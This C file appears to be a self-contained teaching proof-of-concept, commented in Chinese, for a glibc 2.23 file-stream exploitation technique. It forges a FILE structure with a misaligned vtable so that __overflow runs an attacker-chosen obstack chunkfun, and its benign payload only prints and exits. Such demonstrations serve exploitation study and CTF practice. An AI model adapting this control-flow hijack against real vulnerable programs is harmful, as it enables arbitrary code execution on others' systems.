#define _GNU_SOURCE

/*
 * House of Lys 手法，把 obstack vtable 错位使用，适用于本项目的 glibc
 * 2.23 构建。
 *
 * 该构建中：_IO_obstack_jumps = _IO_wfile_jumps - 0x1120。
 * 成功效果：错位后的 overflow 槽会走进 obstack 的 xsputn，最终调用到 chunkfun。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

typedef int (*overflow_fn)(FILE *, int);

static int controlled_argument;

/* chunkfun 的函数地址就是最终被消费的 payload，因此必须单独定义。 */
static void *lys_chunkfun(void *extra_arg, long size)
{
    (void)size;
    assert(extra_arg == &controlled_argument);
    write(STDOUT_FILENO, "[+] Lys 回调命中\n",
          sizeof("[+] Lys 回调命中\n") - 1);
    _exit(0);
}

int main(void)
{
    setbuf(stdout, NULL);

    /* 这里用 dlsym 代替题目里通常要做的一次 libc 地址泄漏。 */
    overflow_fn call_overflow = dlsym(RTLD_DEFAULT, "__overflow");
    void *wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    assert(call_overflow != NULL && wfile_jumps != NULL);

    /* 这是 glibc 2.23 目标构建里固定的相对偏移。 */
    uintptr_t obstack_jumps = (uintptr_t)wfile_jumps - 0x1120;

    unsigned char fake_file[0x100] __attribute__((aligned(0x10)));
    uint64_t fake_obstack[0x60 / 8] __attribute__((aligned(0x10)));
    memset(fake_file, 0, sizeof(fake_file));
    memset(fake_obstack, 0, sizeof(fake_obstack));

    FILE *fp = (FILE *)fake_file;

    /* 保持窄字符路径，并让 overflow 的触发条件成立。 */
    fp->_mode = -1;
    fp->_IO_write_ptr = (char *)1;
    fp->_IO_write_end = (char *)0;

    /* primary vtable 整体错位 +0x20，让 overflow 槽落到 obstack 的 xsputn 上。 */
    *(void **)(fake_file + 0xd8) = (void *)(obstack_jumps + 0x20);

    /* FILE+0xe0 处存的是 fake obstack 的指针。 */
    *(void **)(fake_file + 0xe0) = fake_obstack;

    /* 设置 object_base、next_free 和 chunk_limit，强制让流程走进 _obstack_newchunk。 */
    fake_obstack[0x10 / 8] = 0;
    fake_obstack[0x18 / 8] = 1;
    fake_obstack[0x20 / 8] = 0;

    /* 把 chunkfun 和 extra_arg 都改成我们控制的值。 */
    fake_obstack[0x38 / 8] = (uintptr_t)lys_chunkfun;
    fake_obstack[0x48 / 8] = (uintptr_t)&controlled_argument;
    fake_obstack[0x50 / 8] = 1;

    /* 错位后的 xsputn 会把第三个参数 rdx 当作长度，所以这里显式令 rdx=1。 */
    __asm__ volatile(
        "call *%[target]"
        :
        : [target] "r"(call_overflow), "D"(fp), "S"(EOF), "d"((size_t)1)
        : "rax", "rcx", "r8", "r9", "r10", "r11", "memory");

    /* chunkfun 命中后会 _exit(0)；执行到这里说明利用失败。 */
    _exit(1);
}
